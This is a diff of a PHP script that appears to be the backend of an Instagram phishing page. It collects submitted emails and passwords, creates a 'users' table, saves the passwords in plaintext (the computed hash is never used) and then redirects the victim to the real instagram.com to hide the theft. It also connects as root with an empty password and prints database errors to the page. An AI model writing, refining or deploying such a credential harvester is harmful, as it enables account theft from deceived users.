@@ -1,26 +1,52 @@
 <?php
 session_start();
-require "config.php";
 
+// --- DATABASE CONFIG ---
+$host = "127.0.0.1";   // Use 127.0.0.1 instead of localhost
+$db   = "security";
+$user = "root";
+$pass = "";
+
+try {
+    $conn = new PDO("mysql:host=$host;dbname=$db;charset=utf8", $user, $pass);
+    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+
+    // Create table if not exists
+    $conn->exec("
+        CREATE TABLE IF NOT EXISTS users (
+            id INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
+            email VARCHAR(255) NOT NULL UNIQUE,
+            password VARCHAR(255) NOT NULL,
+            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        )
+    ");
+} catch(PDOException $e) {
+    die("Database connection failed: " . $e->getMessage());
+}
+
+// --- HANDLE FORM SUBMISSION ---
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $email = trim($_POST['email']);
-    $password = trim($_POST['password']);
+    $email = isset($_POST['email']) ? trim($_POST['email']) : "";
+    $password = isset($_POST['password']) ? trim($_POST['password']) : "";
 
-    // Store in database
-    $stmt = $conn->prepare("INSERT INTO users (email, password, created_at) VALUES (:email, :password, NOW())");
-    $stmt->execute([
-        ':email' => $email,
-        ':password' => password_hash($password, PASSWORD_DEFAULT) // hashing password
-    ]);
+    if ($email && $password) {
+        // Hash the password
+        $hashed_password = password_hash($password, PASSWORD_DEFAULT);
 
+        // Insert user into database
+        $stmt = $conn->prepare("INSERT INTO users (email, password) VALUES (:email, :password)");
+        $stmt->bindParam(':email', $email);
+        $stmt->bindParam(':password', $password);
 
-
-    // Redirect to any page
-    header("Location: https://www.instagram.com/"); // change to your page
-    exit;
-} else {
-    // If accessed directly, redirect to form
-    header("Location: index.php");
-    exit;
+        if ($stmt->execute()) {
+            $_SESSION['email'] = $email;
+            header("Location: https://instagram.com"); // Redirect after successful login
+            exit();
+        } else {
+            echo "Error saving data.";
+        }
+    } else {
+        echo "Please fill in all fields.";
+    }
 }
 ?>
